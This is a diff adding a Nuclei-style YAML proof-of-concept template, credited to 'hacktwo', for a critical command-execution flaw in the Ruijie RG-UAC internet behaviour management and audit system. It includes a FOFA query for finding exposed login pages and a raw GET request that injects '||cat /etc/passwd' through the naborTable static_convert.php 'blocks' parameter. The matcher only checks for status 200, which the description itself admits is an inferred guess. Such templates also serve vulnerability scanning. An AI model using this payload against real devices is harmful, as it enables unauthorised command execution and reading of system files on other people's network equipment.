@@ -1,0 +1,21 @@
+id: poc-vd9s3nrfxr5vtmwk
+info:
+  name: 锐捷统一上网行为管理与审计系统naborTable命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vd9s3nrfxr5vtmwk
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vd9s3nrfxr5vtmwk
+    fofa: Title=”RG-UAC登录页面”
+http:
+- raw:
+  - GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
